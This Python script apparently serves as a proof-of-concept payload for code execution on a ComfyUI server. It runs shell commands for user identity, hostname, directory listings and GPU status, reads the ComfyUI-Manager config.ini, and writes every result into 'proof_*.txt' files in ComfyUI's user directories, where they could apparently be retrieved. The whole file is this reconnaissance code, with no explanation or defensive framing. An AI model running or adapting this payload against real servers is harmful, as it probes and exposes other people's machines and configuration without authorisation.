import os, subprocess, time
bases = ["/work/ComfyUI/user", "/work/ComfyUI/user/default"]
def w(n, c):
    for b in bases:
        try:
            p = os.path.join(b, n)
            os.makedirs(os.path.dirname(p), exist_ok=True) if os.path.dirname(p) else None
            open(p, "w").write(c)
        except Exception as e:
            print("WERR", p, e)
    print("=== "+n+" ===")
    print(c)
w("proof_uid.txt", subprocess.getoutput("id"))
w("proof_id.txt", subprocess.getoutput("hostname; pwd; python3 -V; whoami"))
w("proof_tree.txt", subprocess.getoutput("ls -la /work/ComfyUI/user; echo ---; ls -la /work/ComfyUI/user/__manager 2>&1; echo ---; ls -la /work/ComfyUI/user/default 2>&1; echo ---; cat /work/ComfyUI/user/__manager/config.ini 2>&1"))
w("proof_gpu.txt", subprocess.getoutput("nvidia-smi -L 2>&1"))
w("proof_smi1.txt", subprocess.getoutput("nvidia-smi --query-gpu=index,name,utilization.gpu,memory.used,memory.total --format=csv 2>&1"))
time.sleep(30)
w("proof_smi2.txt", subprocess.getoutput("nvidia-smi --query-gpu=index,name,utilization.gpu,memory.used,memory.total --format=csv 2>&1; echo ---; nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv 2>&1"))
w("proof_done.txt", "done " + time.strftime("%H:%M:%S"))
